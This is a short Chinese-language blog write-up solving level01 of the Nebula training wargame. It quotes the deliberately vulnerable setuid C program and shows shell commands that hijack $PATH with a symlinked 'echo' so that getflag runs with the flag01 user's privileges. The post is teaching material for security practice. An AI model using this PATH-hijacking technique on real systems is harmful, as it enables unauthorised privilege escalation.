---
layout: post
title: "Exploit Exercises - Nebula Level01"
date: 2014-01-09 14:54:40 +0800
comments: true
categories:
- Security
- Exercises
- Nebula
---

有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：

``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

<!-- more --> 

前边代码的作用在上一篇博客中提到了，为了使当前的effective uid为flag01，所以system这一句是以flag01这个user的权限执行的。通过/usr/bin/env程序执行了echo程序，在屏幕上打印“and now what？”，不过在执行echo这个命令的时候没有使用绝对路径，使得通过修改$PATH来执行任意程序成为了可能。在本例中，通过修改$PATH和重定向来直接以flag01用户执行/bin/getflag程序：

``` bash
~ $ export PATH=/home/level01:$PATH
~ $ ln -s /bin/getflag /home/level01/echo
~ $ /home/flag01/flag01
You have successfully executed getflag on a target account
```

这样就可以了。通过重定向其他程序为/home/level01/echo，可以用flag01用户执行任意程序。